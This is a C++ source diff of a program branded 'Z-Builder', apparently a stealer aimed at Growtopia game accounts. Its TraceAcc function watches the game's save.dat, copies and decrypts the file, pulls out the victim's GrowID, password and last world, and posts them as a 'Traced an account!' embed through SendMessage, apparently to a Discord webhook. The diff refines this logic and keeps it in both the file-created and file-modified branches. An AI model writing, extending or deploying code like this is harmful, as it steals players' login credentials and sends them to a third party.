@@ -1,4 +1,4 @@
-/ TODO:
+// TODO:
 // Add exception for when there is no save.dat
 
 #define _CRT_SECURE_NO_WARNINGS
@@ -471,101 +471,119 @@ void TraceAcc()
             return;
         }
         string SaveDatLocation = SaveDatPath();
+        ifstream SaveDatCompare(SaveDatLocation);
+        string SaveDatContents = string((istreambuf_iterator<char>(SaveDatCompare)),
+            (istreambuf_iterator<char>()));
         switch (status)
         {
         case FileStatus::created:
             if (path_to_watch == SaveDatLocation)
             {
-                string tempPath = getenv("TEMP");
-                string targetString = tempPath + "\\save.dat";
-                string SaveDatLocation = SaveDatPath();
-                try
+                ifstream SaveDatCompare2(SaveDatLocation);
+                string SaveDatContents2 = string((istreambuf_iterator<char>(SaveDatCompare2)),
+                    (istreambuf_iterator<char>()));
+                if (SaveDatContents == SaveDatContents2)
                 {
-                    wstring wSaveDatLocation;
-                    wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
-                    wstring wTarget;
-                    wTarget.assign(targetString.begin(), targetString.end());
+                    SaveDatContents = SaveDatContents2;
+                    string tempPath = getenv("TEMP");
+                    string targetString = tempPath + "\\save.dat";
+                    string SaveDatLocation = SaveDatPath();
                     try
                     {
-                        CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
+                        wstring wSaveDatLocation;
+                        wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
+                        wstring wTarget;
+                        wTarget.assign(targetString.begin(), targetString.end());
+                        try
+                        {
+                            CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
+                        }
+                        catch (...)
+                        {
+                        }
                     }
-                    catch (...)
+                    catch (...) {}
+                    string AccDataContent = savedecrypt();
+                    string GrowID;
+                    string Password;
+                    string LastWorld;
+                    if (AccDataContent != "")
                     {
+                        string AccDataSplit = "[---Z-Builder---]";
+                        size_t StringSplit = AccDataContent.find(AccDataSplit);
+                        GrowID = AccDataContent.substr(0, StringSplit);
+                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+                        Password = AccDataContent.substr(0, StringSplit);
+                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+                        LastWorld = AccDataContent;
                     }
+                    else
+                    {
+                        GrowID = "No GrowID found";
+                        Password = "No password found";
+                        LastWorld = "No world found";
+                    }
+                    string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
+                    CleanUp();
+                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+                    SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                 }
-                catch (...) {}
-                string AccDataContent = savedecrypt();
-                string GrowID;
-                string Password;
-                string LastWorld;
-                if (AccDataContent != "")
-                {
-                    string AccDataSplit = "[---Z-Builder---]";
-                    size_t StringSplit = AccDataContent.find(AccDataSplit);
-                    GrowID = AccDataContent.substr(0, StringSplit);
-                    AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-                    Password = AccDataContent.substr(0, StringSplit);
-                    AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-                    LastWorld = AccDataContent;
-                }
-                else
-                {
-                    GrowID = "No GrowID found";
-                    Password = "No password found";
-                    LastWorld = "No world found";
-                }
-                string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
-                CleanUp();
-                string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
-                SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
+                
             }
             break;
         case FileStatus::modified:
             if (path_to_watch == SaveDatLocation)
             {
-                string tempPath = getenv("TEMP");
-                string targetString = tempPath + "\\save.dat";
-                string SaveDatLocation = SaveDatPath();
-                try
+                ifstream SaveDatCompare2(SaveDatLocation);
+                string SaveDatContents2 = string((istreambuf_iterator<char>(SaveDatCompare2)),
+                    (istreambuf_iterator<char>()));
+                if (SaveDatContents == SaveDatContents2)
                 {
-                    wstring wSaveDatLocation;
-                    wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
-                    wstring wTarget;
-                    wTarget.assign(targetString.begin(), targetString.end());
+                    SaveDatContents = SaveDatContents2;
+                    string tempPath = getenv("TEMP");
+                    string targetString = tempPath + "\\save.dat";
+                    string SaveDatLocation = SaveDatPath();
                     try
                     {
-                        CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
+                        wstring wSaveDatLocation;
+                        wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
+                        wstring wTarget;
+                        wTarget.assign(targetString.begin(), targetString.end());
+                        try
+                        {
+                            CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
+                        }
+                        catch (...)
+                        {
+                        }
                     }
-                    catch (...)
+                    catch (...) {}
+                    string AccDataContent = savedecrypt();
+                    string GrowID;
+                    string Password;
+                    string LastWorld;
+                    if (AccDataContent != "")
                     {
+                        string AccDataSplit = "[---Z-Builder---]";
+                        size_t StringSplit = AccDataContent.find(AccDataSplit);
+                        GrowID = AccDataContent.substr(0, StringSplit);
+                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+                        Password = AccDataContent.substr(0, StringSplit);
+                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+                        LastWorld = AccDataContent;
                     }
+                    else
+                    {
+                        GrowID = "No GrowID found";
+                        Password = "No password found";
+                        LastWorld = "No world found";
+                    }
+                    string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
+                    CleanUp();
+                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+                    SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                 }
-                catch (...) {}
-                string AccDataContent = savedecrypt();
-                string GrowID;
-                string Password;
-                string LastWorld;
-                if (AccDataContent != "")
-                {
-                    string AccDataSplit = "[---Z-Builder---]";
-                    size_t StringSplit = AccDataContent.find(AccDataSplit);
-                    GrowID = AccDataContent.substr(0, StringSplit);
-                    AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-                    StringSplit = AccDataContent.find(AccDataSplit);
-                    Password = AccDataContent.substr(0, StringSplit);
-                    AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-                    LastWorld = AccDataContent;
-                }
-                else
-                {
-                    GrowID = "No GrowID found";
-                    Password = "No password found";
-                    LastWorld = "No world found";
-                }
-                CleanUp();
-                string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
-                string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
-                SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
+
             }
             break;
         case FileStatus::erased:
